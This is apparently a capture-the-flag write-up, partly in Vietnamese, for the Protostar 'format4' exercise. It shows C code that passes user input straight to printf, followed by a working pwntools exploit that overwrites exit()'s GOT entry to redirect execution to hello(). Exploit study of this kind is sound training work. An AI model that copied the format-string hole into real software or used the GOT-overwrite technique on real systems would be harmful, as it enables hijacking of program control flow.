# format string 4

## source code

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);   
}

int main(int argc, char **argv)
{
  vuln();
}
```

## solution

sử dụng format string để ghi giá trị của hàm hello() vào exit() trong bảng GOT.

### exploit with pwntool

```python
#!python3
from pwn import *
# Assume a process that reads a string
# and gives this string as the first argument
# of a printf() call
# It do this indefinitely


# Function called in order to send a payload
def send_payload(payload):
    p = process('../../protostar/format4')
    p.sendline(payload)
    log.info("payload = %s" % repr(payload))
    a = p.recvall()
    log.info("output = %s" % repr(a))
    p.close()
    return a

# Create a FmtStr object and give to him the function
format_string = FmtStr(execute_fmt=send_payload)
offset = format_string.offset
log.info("offset = %d" % offset)
write = {
    0x8049724: 0x80484b4
    # địa chỉ exit() trong GOT : địa chỉ hàm hello()
}
#33 = size của payload tìm ra offset
payload = fmtstr_payload(offset, write)
payload = payload + b'a' * (33 - len(payload))
log.info("payload = %s" % repr(payload))
p = process('../../protostar/format4')
p.sendline(payload)

print(p.recvall())
```

![1](1.png)

### %n

![2](2.png)

mất khoảng 10s để in đủ số ký tự của payload

### %hn

![4](4.png)

### %hhn

![6](6.png)